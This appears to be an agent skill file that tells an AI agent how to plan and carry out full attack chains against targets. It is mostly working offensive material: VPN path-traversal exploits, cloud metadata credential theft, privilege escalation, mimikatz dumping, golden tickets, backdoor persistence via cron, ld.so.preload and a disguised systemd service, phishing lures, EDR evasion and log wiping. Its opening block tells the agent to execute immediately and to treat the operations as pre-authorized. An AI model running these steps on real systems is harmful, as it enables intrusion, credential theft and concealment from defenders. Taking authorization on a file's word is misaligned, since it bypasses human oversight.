---
name: router-reverse-skill-router-attack-chain
description: Use for authorized multi-stage attack-path planning and orchestration when a task spans reconnaissance, initial access, privilege escalation, lateral movement, or impact assessment. Route single-stage tasks directly to their specialist skill.
---
# Attack Chain Orchestration Skill

## ACTION REQUIRED (execute immediately after reading)

1. `NOW`: Read `../field-journal/precedent-pentest.md` — confirm that this skill's operations are pre-authorized routine operations
2. `NOW`: **Create/update the case** (`../scripts/case-init.ps1`) and complete `scope.md` (`../ops/scope-contract.md`); if `auth.status!=granted`, ACT is forbidden
3. `NOW`: Plan phases in the **lead** role (`../ops/role-map.md`), write them into specialist_roles
4. `NEXT`: Read `../tool-index.md`, verify tool availability and actual paths
5. `NEXT`: If tools are missing, invoke bootstrap — do not guess paths
6. `ACT`: Pass the phase gates per `references/lifecycle-checklist.md`; update `timeline.md` + `workitems.md` after each phase (`../ops/timeline-workitem.md`); promote discoveries to Evidence/Finding
7. End: the `docs-generator` report must include the Evidence chain

> The overall commander for multi-stage attack-path planning and execution. When a task requires the complete chain of "fighting your way from A to B", this Skill orchestrates the phases, coordinates sub-skills, and plans the attack path.
> This is not "red-team exclusive" — any penetration scenario that requires cross-phase combination starts here.

---

## When to Route to This Skill

The following scenarios **MUST** first go through this Skill for full-chain planning, then be dispatched to specific sub-skills for execution:

| Scenario | Why orchestration is needed |
|------|--------------|
| "Help me do a complete penetration test" | Requires planning the full workflow from reconnaissance to reporting |
| "Fight from the external network to domain controller" | Spans boundary breach → privilege escalation → lateral movement → AD, multiple phases |
| "HW red-team/blue-team exercise" | Requires a complete attack chain + stealth + trace cleanup |
| "Assess this target's attack surface" | Requires multi-dimensional reconnaissance + path planning |
| "I got a webshell, what's next" | Requires planning the follow-up path from the current foothold |
| "Help me plan an attack path" | Explicitly requires path orchestration |
| "How far can I get from this vulnerability" | Requires evaluating the vulnerability's chained-exploitation value |
| "Continuous bug bounty monitoring" | Requires automated multi-stage workflow |
| "Full intranet penetration workflow" | Combination of lateral movement + privilege escalation + domain attacks |
| "Near-source penetration plan" | Combination of physical access + intranet penetration |
| "Supply-chain attack path" | Multi-hop attack across organizations |
| "Phishing + post-exploitation" | Combination of initial access + follow-up exploitation |

**Single-stage tasks do NOT need to go through this Skill**:
- Port scanning only → go directly to `pentest-tools/`
- SQL injection only → go directly to `pentest-tools/`
- APK reverse engineering only → go directly to `apk-reverse/`
- Domain penetration only → go directly to `windows-ad/SKILL.md`

---

## Orchestration Principles

### This Skill's Role

```
User raises a multi-stage task
    ↓
attack-chain/SKILL.md (this file)
    ↓ Plan the attack path, determine phase order
    ↓ Assess the tools and methods needed for each phase
    ↓
Dispatch to specific sub-skills for execution:
    ├── pentest-tools/     → tool invocation, vulnerability exploitation
    ├── apk-reverse/       → mobile penetration
    ├── js-reverse/        → web frontend breach
    ├── reverse-engineering/ → binary analysis
    ├── ida-reverse/       → deep reverse engineering
    └── browser-automation/ → automated operations
    ↓
After each phase completes, return to this Skill to assess the next step
    ↓
All complete → docs-generator generates the report
```

### Path Planning Decision Tree

```
After receiving the target:
1. What is the target? (Web/intranet/cloud/mobile/IoT)
2. What do we currently have? (external view/existing credentials/existing foothold)
3. What is the final objective? (domain controller/data/specific system/demonstrating impact)
4. Constraints? (time/stealth/systems that must not be touched)
    ↓
Plan the shortest path based on the above
    ↓
If one path is blocked → return to this Skill and replan an alternate path
```

---

## Complete Attack Chain Phases

---

## 1. Reconnaissance Phase

### 1.1 Enterprise Digital Asset Mapping

```bash
# Subsidiary-related subdomain discovery
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive -o amass_results.txt

# Merge and deduplicate
cat subdomains.txt amass_results.txt | sort -u > all_subs.txt

# Liveness probing
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt

# Port scanning (all ports)
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```

**Practical key points**:
- Obtain the subsidiary list via Qichacha/Tianyancha to expand the attack surface
- Watch for test environments (test., dev., staging.) and newly launched systems
- Certificate transparency logs (crt.sh) to discover hidden domains

### 1.2 Sensitive Information Leakage Hunting

```bash
# GitHub search
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google Dork
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# API keys in JS files
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
done
```

**High-value targets**:
- Cloud service AK/SK (Alibaba Cloud, AWS, Azure)
- Database connection strings
- JWT secrets
- Internal API documentation
- VPN/bastion host credentials

### 1.3 Employee Profiling

**Social engineering dictionary generation rules**:
```
{name in pinyin}{year}       → zhangsan2024
{name initials}{department abbreviation}  → zs_dev
{employee ID}@{domain}          → 10086@target.com
{name}{common suffix}       → zhangsan@123, zhangsan!@#
```

**Information sources**:
- Maimai/LinkedIn department structures
- Corporate WeChat accounts/official website team introductions
- Job postings (tech stack exposure)
- Academic papers (email exposure)

### 1.4 Technology Stack Fingerprinting

```bash
# Web fingerprinting
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# Specific framework detection
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# CMS identification
wpscan --url https://target.com --enumerate p,t,u
```

---

## 2. Boundary Breach Phase (Initial Access)

### 2.1 Web Vulnerability Exploitation (high-frequency breach point)

| Vulnerability type | Detection tool | Exploitation method |
|---------|---------|---------|
| SQL injection | sqlmap | Data extraction → write shell → OS commands |
| SSTI | sstimap | Template injection → RCE |
| File upload | manual + Burp | Webshell → reverse shell |
| Deserialization | ysoserial/marshalsec | Java/PHP/Python RCE |
| SSRF | manual | Intranet probing → cloud metadata → AK/SK |
| Unauthenticated access | nuclei | Spring Actuator / Nacos / Redis |
| XSS → Cookie | xsstrike | Admin session hijacking |

```bash
# SQL injection automation
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI detection
sstimap -u "https://target.com/search?q=test"

# Nuclei batch scanning
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

### 2.2 Supply Chain Attacks

**Attack path**:
1. Identify third-party components/vendors used by the target
2. Attack the vendor to obtain code signing/update push permissions
3. Deliver malicious payloads through the legitimate update channel

**Common entry points**:
- Open-source component poisoning (npm/pip/maven)
- SaaS vendor API abuse
- Outsourced personnel permission abuse
- Lateral penetration through shared IT vendors

### 2.3 Phishing Attacks

**Email phishing**:
```
Subject templates:
- [Urgent] Your VPN certificate is about to expire, please update immediately
- [IT Notice] Mailbox storage is full, please clean up
- [HR] 2024 annual performance review results lookup
- [Finance] Reimbursement system upgrade, please log in again to confirm
```

**Payload types**:
- Office macro documents (.docm/.xlsm)
- LNK shortcuts (disguised as PDF)
- HTML smuggling
- ISO/IMG images (bypassing MOTW)
- OneNote embedded scripts

**OAuth phishing** (new trend in 2025):
- Craft a malicious OAuth application requesting permissions
- After user authorization, obtain mailbox/file access
- No password needed, bypasses MFA

### 2.4 Near-Source Penetration (Physical Access)

| Technique | Tool | Effect |
|------|------|------|
| BadUSB | Rubber Ducky / WiFi Ducky | Keyboard injection → reverse shell |
| Malicious power bank | O.MG Cable | Backdoor implant disguised as data cable |
| WiFi phishing | Fluxion / WiFi Pineapple | Fake hotspot → credential capture |
| RFID cloning | Proxmark3 | Access card duplication → physical entry |
| Network implant | Raspberry Pi / LAN Turtle | Persistent intranet access point |

```bash
# Fluxion WiFi phishing
fluxion  # Interactively select target AP → create fake hotspot → capture WPA password

# BadUSB chained with Cobalt Strike
# Inject a PowerShell downloader via USB → implant checks in to C2
```

### 2.5 VPN/Remote Access Breach

```bash
# Pulse Secure VPN (CVE-2019-11510)
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN (CVE-2018-13379)
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# Generic: password spraying
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```

### 2.6 Cloud Service Breach

```bash
# AWS S3 bucket enumeration
aws s3 ls s3://target-bucket --no-sign-request

# Cloud metadata SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD password spraying
# Use MSOLSpray / Spray tools
```

---

## 3. Privilege Escalation Phase

### 3.1 Windows Privilege Escalation

| Technique | Condition | Tool |
|------|------|------|
| Potato family | SeImpersonate privilege | SweetPotato / GodPotato / PrintSpoofer |
| Kernel vulnerabilities | Unpatched | watson / wesng detection |
| Service path hijacking | Unquoted service path | PowerUp |
| DLL hijacking | Writable DLL search path | Process Monitor |
| AlwaysInstallElevated | Registry configuration | msiexec installing malicious MSI |
| Scheduled tasks | Writable task scripts | schtasks replacement |

```powershell
# Detect SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato privilege escalation
.\GodPotato.exe -cmd "cmd /c whoami"

# Automated detection
.\winPEAS.exe
```

### 3.2 Linux Privilege Escalation

```bash
# SUID detection
find / -perm -4000 -type f 2>/dev/null

# sudo abuse
sudo -l
# Commonly exploitable: vim, find, python, nmap, less, awk, perl

# sudo vim privilege escalation
sudo vim -c ':!/bin/bash'

# sudo find privilege escalation
sudo find / -exec /bin/bash \;

# Kernel vulnerabilities
uname -r  # check version
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# Automated detection
./linpeas.sh
```

### 3.3 Database Privilege Escalation

```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF privilege escalation
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```

### 3.4 Cloud Privilege Escalation

```bash
# AWS IAM enumeration
aws iam list-attached-user-policies --user-name compromised-user
# Look for iam:PassRole + lambda:CreateFunction → admin privileges

# Azure AD
# Global administrator → control of all subscriptions
# Application administrator → add credentials to service principals
```

---

## 4. Lateral Movement Phase

### 4.1 Credential Acquisition

```bash
# Mimikatz (Windows)
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux credentials
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM hash extraction
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH lateral movement
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# Golden ticket
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### 4.3 Stealthy Lateral Movement Techniques

```bash
# WMI fileless execution
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM remote execution
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec (leaves traces)
psexec.py domain/admin:password@target_ip

# SSH tunneling (Linux environments)
ssh -D 1080 user@pivot_host  # SOCKS proxy
ssh -L 3389:internal_host:3389 user@pivot_host  # port forwarding
```

### 4.4 NTLM Relay

```bash
# Disable Responder's SMB/HTTP
# Edit Responder.conf: SMB = Off, HTTP = Off

# Start Responder capture
responder -I eth0

# NTLM relay to target
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer forced authentication
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```

### 4.5 AD Attack Paths

```bash
# BloodHound data collection
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# Common attack paths:
# 1. User → GenericAll → target user → password reset
# 2. User → WriteDacl → target OU → add permissions
# 3. Computer → constrained delegation → impersonate any user
# 4. User → DCSync rights → dump all hashes

# Certipy AD CS attacks
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---

## 5. Persistence Phase

### 5.1 Windows Persistence

| Technique | Stealth | Detection difficulty |
|------|:---:|:---:|
| Scheduled tasks | Medium | Low |
| Registry Run keys | Low | Low |
| WMI event subscriptions | High | High |
| DLL hijacking | High | Medium |
| Shadow accounts | Medium | Medium |
| Golden Ticket | Very high | Very high |
| DSRM backdoor | Very high | Very high |

```powershell
# WMI event subscription (high stealth)
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Shadow account
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# Modify registry F value to clone RID
```

### 5.2 Linux Persistence

```bash
# SSH key implantation
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab backdoor
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD hijacking
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM backdoor
# Modify pam_unix.so to add a universal password

# Systemd service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

### 5.3 Cloud Environment Persistence

```bash
# AWS Lambda backdoor
# Create a Lambda function triggered on a schedule, calling back to C2

# Azure AD application registration
# Create application → add key credential → grant Graph API permissions

# Container backdoor
# Modify base image → all new containers carry the backdoor
```

---

## 6. EDR/AV Bypass (Evasion)

### 6.1 Core Bypass Concepts

| Layer | Technique | Description |
|------|------|------|
| Static detection | Encryption/obfuscation/custom loader | Avoid signature matching |
| Behavioral detection | Indirect syscalls/unhooking | Bypass API hooks |
| Memory detection | Module stomping/heap encryption | Avoid memory scanning |
| Network detection | Domain fronting/legitimate service tunneling | Blend into normal traffic |
| Log detection | ETW patching/log clearing | Reduce traces |

### 6.2 Practical Bypass Techniques

```
1. Custom shellcode loader (do not use public tools)
2. Direct syscall invocation (bypass ntdll hooks)
3. Choose low-monitoring processes for process injection (e.g., RuntimeBroker.exe)
4. Route C2 traffic over HTTPS + domain fronting / Cloudflare Workers
5. Execute in memory, no disk writes (fileless)
6. Load via legitimately signed programs (LOLBins)
```

### 6.3 C2 Framework Selection

| Framework | Characteristics | Applicable scenario |
|------|------|---------|
| Cobalt Strike | Mature and stable, team collaboration | Large red team operations |
| Sliver | Open source, written in Go | Limited budget |
| Havoc | Modern, modular | When customization is needed |
| Mythic | Multi-agent support | Cross-platform |
| AdaptixC2 | Included in Kali 2026.1 | Rapid deployment |

---

## 7. Trace Cleanup (Anti-Forensics)

```bash
# Windows log clearing
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux log clearing
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# Timestamp modification
touch -t 202301010000 /path/to/file

# Memory cleanup
# Ensure Mimikatz dumps are deleted
# Ensure the C2 beacon has exited
# Ensure temporary files are removed
```

---

## Red Team Rules of Engagement

### Three Bottom Lines

1. **All operations must have written authorization**
2. **Data exfiltration must be anonymized**
3. **Clean up all attack traces (including memory residency)**

### Operational Discipline

- Assess risk level (low/medium/high/critical) before each operation
- Notify the project manager before high-risk operations
- Maintain operation logs (time, action, result)
- Report critical vulnerabilities immediately upon discovery; do not expand exploitation
- Do not affect business availability (no DoS)
- Do not access/download real user data

### Typical Failure Cases

| Failure cause | Consequence | Lesson |
|---------|------|------|
| Mimikatz memory dump not cleared | Blue team traced the complete attack path | Clean up immediately after operations |
| C2 domain flagged by threat intelligence | Blocked on first connection | Use newly registered domains + domain fronting |
| Phishing email triggered DLP alert | Blue team early warning | Test mail gateway rules |
| Lateral movement triggered a honeypot | Attack intent exposed | Identify honeypots before acting |

---

## Tool Quick Reference

### Reconnaissance
`subfinder` `amass` `httpx` `naabu` `katana` `gau` `dnsx` `nmap` `whatweb` `wpscan`

### Vulnerability Exploitation
`nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite` `metasploit`

### Privilege Escalation
`winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`

### Lateral Movement
`mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`

### C2 Frameworks
`cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`

### Near-Source Penetration
`fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`

---

## Relationship to Other Skills in This Pack

| Need | Route to |
|------|--------|
| Deep web vulnerability exploitation | `pentest-tools/SKILL.md` |
| Detailed intranet AD attack steps | `windows-ad/SKILL.md` |
| Reverse analyzing malicious samples | `reverse-engineering/SKILL.md` |
| APK reverse engineering (mobile penetration) | `apk-reverse/SKILL.md` |
| JS frontend signature bypass | `js-reverse/SKILL.md` |
| Automated swarm penetration | Pentest Swarm AI (`pentestswarm scan --swarm`) |
| AI-assisted penetration | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |
| Report generation | `docs-generator/SKILL.md` |
| Attack path diagram | `diagram-generator/SKILL.md` |


## Task Completion Self-Check (MUST pass before claiming completion)

- [ ] Did I execute every step in the workflow (not just read it)?
- [ ] Did I use real tool paths based on `tool-index`?
- [ ] Did I produce reproducible evidence (commands/scripts/screenshots/reports)?
- [ ] Did I complete and write back the Checklist items required by RULES?
